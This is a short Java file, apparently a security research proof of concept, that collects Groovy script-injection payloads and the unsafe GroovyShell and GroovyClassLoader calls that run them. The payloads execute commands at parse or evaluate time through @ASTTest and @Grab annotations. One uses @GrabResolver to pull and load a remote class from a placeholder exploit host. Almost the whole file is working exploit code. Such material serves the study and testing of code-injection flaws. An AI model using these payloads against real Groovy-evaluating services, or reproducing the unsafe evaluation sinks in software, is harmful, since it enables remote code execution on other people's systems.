/*
 * @author welkin
 * @date 2019.05.29
 */

import groovy.lang.GroovyClassLoader;
import groovy.lang.GroovyShell;

public class GroovyInjectionPayloads {

    // execution by @groovy.transform.ASTTest when parse script
    public static final String evilScript1 = "@groovy.transform.ASTTest(value={\n" +
            "    assert java.lang.Runtime.getRuntime().exec(\"calc\")\n" +
            "})\n" +
            "def x\n";

    // execution by @GrabResolver and @Grab when parse script
    public static final String evilScript2 = "@GrabConfig(disableChecksums=true)%0a\n" +
            "@GrabResolver(name='payload', root='http://<EXPLOIT HOST>')%0a\n" +
            "@Grab(group='package', module='payload', version='1')%0a\n" +
            "import Payload;";

    // execution when evaluate script
    public static final String evilScript3 = "import org.buildobjects.process.ProcBuilder\n" +
            "@Grab('org.buildobjects:jproc:2.2.3')\n" +
            "class Dummy{ }\n" +
            "print new ProcBuilder(\"calc\").run().getOutputString()\n";

    /**
     * dangerous usage of {@link GroovyClassLoader#parseClass(String)}
     *
     * @param script the dynamic groovy script.
     */
    public static void parseByGroovyClassLoader(String script){
        GroovyClassLoader classLoader = new GroovyClassLoader();
        Class testGroovyClass = (classLoader).parseClass(script);
    }

    /**
     * dangerous usage of {@link GroovyShell#parse(String)}
     *
     * @param script the dynamic groovy script.
     */
    public static void parseByGroovyShell(String script){
        GroovyShell groovyShell = new GroovyShell();
        groovyShell.parse(script);
    }

    /**
     * dangerous usage of {@link GroovyShell#evaluate(String)}
     *
     * @param script the dynamic groovy script.
     */
    public static void evalByGroovyShell(String script){
        GroovyShell groovyShell = new GroovyShell();
        groovyShell.evaluate(script);
    }

    public static void main(String[] args) {

        parseByGroovyClassLoader(evilScript1);
//        parseByGroovyClassLoader(evilScript2);
        parseByGroovyShell(evilScript1);
//        parseByGroovyShell(evilScript2);
        evalByGroovyShell(evilScript3);
    }

}
